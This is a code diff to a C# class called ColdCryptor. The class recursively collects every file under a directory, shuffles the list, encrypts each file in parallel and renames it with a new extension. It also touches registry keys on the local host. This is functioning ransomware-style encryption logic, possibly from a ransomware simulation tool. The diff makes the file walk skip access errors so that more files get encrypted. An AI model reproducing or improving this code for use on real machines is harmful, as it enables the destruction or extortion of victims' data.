@@ -136,14 +136,26 @@ public static class ColdCryptor
             }
             else
             {
-                files = Directory.EnumerateFiles(directories[0], "*", SearchOption.AllDirectories).ToList();
+                // Directory.EnumerateFiles in .NET Framework does not MoveNext() properly on exceptions
+                AddAllFiles(directories[0], files);
             }
 
+            int ct_enc = 0;
+            int ct_skip = 0;
             files.Shuffle();
             Parallel.ForEach(files, file => {
-                EncryptFile(file, extension, crypto);
-                Console.WriteLine(file);
+                try{
+                    EncryptFile(file, extension, crypto);
+                    Console.WriteLine("ENC " + file);
+                    ct_enc++;
+                } catch{
+                    Console.WriteLine("ERR " + file);
+                    ct_skip++;
+                }    
             });
+            Console.WriteLine("");
+            Console.WriteLine("Encrypted: " + ct_enc);
+            Console.WriteLine("Errors: " + ct_skip);
 
             // if the current direcory is a UNC path or the supplied directory is a UNC path, don't set the registry keys 
             //     as they only apply to the local host and not the host where the UNC path is located
@@ -201,6 +213,7 @@ public static class ColdCryptor
             }
         }
 
+        Console.WriteLine("");
         Console.WriteLine("Done");
         return;
     }
@@ -225,5 +238,20 @@ public static class ColdCryptor
         fsOut.Close();
         memTmp.Close();
         File.Move(inputFile, inputFile + "." + ext);
+    }
+
+    public static List<string> AddAllFiles(string dir, List<string> files)
+    {
+        foreach (string file in Directory.GetFiles(dir)) {
+            files.Add(file);
+        }
+        foreach (string subDir in Directory.GetDirectories(dir)) {
+            try {
+                AddAllFiles(subDir, files);
+            } catch {
+                //nothing
+            }
+        }
+        return files;
     }
 }
